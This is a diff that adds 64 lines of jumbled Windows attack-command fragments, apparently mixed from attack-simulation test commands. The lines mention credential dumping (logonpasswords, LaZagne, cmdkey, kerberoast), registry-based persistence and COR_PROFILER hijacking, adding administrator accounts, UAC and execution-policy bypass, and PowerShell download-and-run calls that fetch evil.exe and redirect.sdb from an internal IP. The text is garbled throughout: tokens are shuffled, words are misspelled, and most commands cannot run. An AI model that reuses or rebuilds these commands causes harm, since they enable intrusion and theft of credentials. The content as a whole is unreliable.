@@ -1,0 +1,64 @@
+[ net.servicepointmanager ] : :logonpasswords
+iediagcmd.exe /out : $ `` you '' % username '' \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' in '' in $ { target = volumn name you target = keylog
+theharvester -t $ shortcut.windowstyle = `` cor_profiler = '' )
+net localgroup 1
+tasklist
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows `` : cor_profiler '' -name cor_enable_profiling $ '' `` cor_profiler '' '' -name $ inputprovider '' , bypass
+net localgroup `` administrators '' /t reg_dword /d 1 /f
+nbtstat -n
+cmdkey /list
+iex ( new-object net.webclient ) % localappdata \\ $ http http ) \\ $ { copy //192.168.1.29:9000/payload/redirect.sdb -o ) wevtutil net.webclient ; querylanguage= http : //192.168.1.29:9000/payload/redirect.sdb -o os ; querylanguage= 240 $ target = domain = `` $ target = `` '' t1547.009 software\classes\clsid\ target t1547.009
+reg delete $ `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /f
+net localgroup -executionpolicy -verbose
+security -new -exec= $ ping $ { user_name } /add
+lazagne.exe windows
+get-eventlog -list | foreach-object http http : //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+wt.exe
+adfind.exe -o : hklm : @ '' \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' '' /user administrators '' in '' $ hklm\software\microsoft\windows t1547.009 .id c : \users\ @ $ ( `` hkcu\software\classes\clsid\ domain admins '' = `` $ { target volumn name you components\atomic_test file ; -t '' admins =
+net localgroup `` administrators '' '' '' file '' /v cor_profiler ''
+rundll32.exe ) \\ `` keylog
+iediagcmd.exe autodialdll -l $ target `` t1547.009 t1547.009 x64\print cor_profiler cor_profiler -n
+iediagcmd.exe -o $ { base64_commmand } kerberoast threadingmodel
+wt.exe -l $ target $ target t1547.009 in hklm\software\microsoft\windows manager\appcertdlls '' t1547.009 /v cor_profiler ''
+get-process | foreach-object ( new-object net.securityprotocoltype net.webclient //192.168.1.29:9000/payload/redirect.sdb -o //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+for : $ target = `` powershell '' `` cor_profiler '' , cor_profiler '' -name threadingmodel ''
+get-localgroupmember -group `` administrators '' /f
+$ shortcut = `` $ shortcutlocation = `` hklm\software\microsoft\windows t1547.009 /user http % tracking '' -name cor_profiler ''
+bypassuac.exe $ domain
+silentrunner.exe
+new-itemproperty -path `` '' c : set-wmiinstance -namespace http : http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+git clone -lsa
+wmic process bypass
+unregmp2.exe /hidewmp
+tracert % windir % \system32\windowspowershell\v1.0\powershell.exe % /export `` keylog
+namp -sn -l $ target t1547.009 t1547.009 software\classes\clsid /user : = '' target_ip
+namp -sn $ target ; in `` $ `` hklm\software\microsoft\windows t1547.009 \programdata\microsoft\windows\start /setnotifycmdline /f
+get-localgroup
+net localgroup administrators `` cor_profiler '' ''
+remove-item -path $ : t1547.009 . @ domain = administrators '' $ filter -name `` volumn name you copy ; querylanguage= administrators '' /add
+set-executionpolicy -executionpolicy bypass -scope -command
+python make_image.py $ { compression_level -o $ { volumn name you http shell.createshortcut http : \users\ /active group t1547.009 /nowrap ''
+remove-item -path $ { filename_regex }
+net localgroup administrators `` cor_profiler '' ''
+quser
+$ shortcut = `` $ i = `` $ cor_enable_profiling = `` administrators '' -name debugger /d `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+gobuster dns -d $ ( { user_name } in `` $ shortcutlocation '' -c `` `` inprocserver32 ;
+ttdinject.exe /clientparams `` localaccount=true | select-object -expandproperty
+net `` hkcu\software\classes\clsid\ `` nt\currentversion\winlogon\notify\atomicredteam '' -name `` cor_profiler '' /f
+silentrunner.exe $ : t1547.009 options\osk.exe ''
+tasklist
+rdrleakdiag.exe /p % \system32\osk.exe
+fsutil.exe trace decode -t -t / $ { i -w password
+adfind.exe -o { keylog
+quser
+remove-item -path `` $ : \windows\system32\desk.cpl , keylog
+dumpminitool.exe -o $ { administrators }
+namp -sn -l $ target '' t1547.009 . , domain /user administrators '' $ true
+remove-item -path $ target t1547.009 /fullmemdmp set-wmiinstance objws = http http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+ren $ shortcutlocation admins = `` domain admins '' '' -name '' @ `` cor_profiler '' -name threadingmodel '' -name threadingmodel ''
+videocap.exe -t $ shortcutlocation admins `` `` inprocserver32 '' c administrators '' '' -name administrators '' $ : # : cor_profiler ''
+cmdkey /list
+remove-item -path $ a = `` $ { filename_regex } ''
+net localgroup `` administrators '' '' /v cor_profiler '' ''
+reg.exe add `` localaccount=true $ `` 7 powershell '' '' /t packages '' '' -name $ `` threadingmodel '' '' ''
+cmdkey /list
